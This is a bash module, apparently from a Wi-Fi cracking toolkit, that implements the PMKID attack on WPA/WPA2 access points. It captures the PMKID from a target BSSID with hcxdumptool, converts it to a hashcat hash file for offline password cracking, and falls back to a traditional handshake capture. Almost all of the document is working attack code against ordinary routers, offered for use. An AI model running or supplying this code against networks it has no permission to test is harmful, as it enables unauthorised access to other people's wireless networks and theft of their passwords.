# PMKID Attack Implementation
#
# PMKID (Pairwise Master Key Identifier) Attack - Discovered by Hashcat developers in 2018
# This attack exploits a weakness in the WPA/WPA2 handshake by directly extracting the PMKID
# from the access point without requiring a connected client or full 4-way handshake.
#
# References:
# - https://hashcat.net/forum/thread-7717.html (Original PMKID attack announcement)
# - https://github.com/ZerBea/hcxdumptool (hcx tools official repository)
# - https://github.com/ZerBea/hcxtools (conversion tools)
#
# Advantages over traditional handshake capture:
# - No clients required (clientless attack)
# - Faster capture (usually < 30 seconds)
# - Works on many modern routers
#
# Requirements: hcxdumptool, hcxpcapngtool

attack_pmkid() {
    log_info "Starting PMKID attack (clientless method)..."
    
    # Check for required tools
    if ! command -v hcxdumptool &> /dev/null; then
        log_error "hcxdumptool not found"
        log_info "Install with: sudo apt install hcxtools"
        return 1
    fi
    
    if ! command -v hcxpcapngtool &> /dev/null; then
        log_error "hcxpcapngtool not found"
        log_info "Install with: sudo apt install hcxtools"
        return 1
    fi
    
    PMKID_FILE="$OUTPUT_DIR/${TARGET_ESSID//[^a-zA-Z0-9]/_}_pmkid"
    
    # Remove old files
    rm -f "${PMKID_FILE}"*.pcapng 2>/dev/null
    rm -f "${PMKID_FILE}"*.hc22000 2>/dev/null
    
    log_info "Capturing PMKID from $TARGET_ESSID..."
   log_info "Target BSSID: $TARGET_BSSID"
    log_info "Channel: $TARGET_CHANNEL"
    
    # Run hcxdumptool to capture PMKID
    # --enable_status=1: Display status
    # -o: Output file
    # -c: Channel
    # --filterlist_ap: Filter for specific BSSID
    # --filtermode: Attack mode (2 = PMKID only)
    
    timeout 60 hcxdumptool -i "$MONITOR_INTERFACE" -o "${PMKID_FILE}.pcapng" \
        --enable_status=15 --filterlist_ap=<(echo "$TARGET_BSSID") --filtermode=2 2>&1 | \
        grep -E "(FOUND|PMKID)" || true
    
    sleep 2
    
    # Check if PMKID was captured
    if [ -f "${PMKID_FILE}.pcapng" ]; then
        # Convert to hashcat format
        log_info "Converting PMKID to hashcat format..."
        hcxpcapngtool -o "${PMKID_FILE}.hc22000" "${PMKID_FILE}.pcapng" > /dev/null 2>&1
        
        if [ -f "${PMKID_FILE}.hc22000" ] && [ -s "${PMKID_FILE}.hc22000" ]; then
            log_success "PMKID captured successfully!"
            log_success "Hash file: ${PMKID_FILE}.hc22000"
            
            # Set for hashcat cracking
            HASHCAT_HASH_FILE="${PMKID_FILE}.hc22000"
            
            # Update statistics
            STATS_NETWORKS_ATTACKED=$((STATS_NETWORKS_ATTACKED + 1))
            
            return 0
        else
            log_warning "PMKID captured but conversion failed"
            return 1
        fi
    else
        log_error "Failed to capture PMKID"
        log_warning "Possible reasons:"
        log_warning "  - Router may not be vulnerable to PMKID attack"
        log_warning "  - Signal too weak"
        log_warning "  - Router firmware patched"
        return 1
    fi
}

# Combined attack: Try PMKID first, fall back to handshake
attack_pmkid_or_handshake() {
    log_info "Attempting PMKID attack first (faster, clientless)..."
    
    if attack_pmkid; then
        log_success "PMKID attack successful!"
        ATTACK_MODE="pmkid"
        return 0
    else
        log_warning "PMKID attack failed, falling back to handshake capture..."
        echo ""
        read -p "Continue with traditional handshake capture? (y/n): " continue_handshake
        
        if [ "$continue_handshake" = "y" ] || [ "$continue_handshake" = "Y" ]; then
            capture_handshake
            ATTACK_MODE="handshake"
            return $?
        else
            return 1
        fi
    fi
}
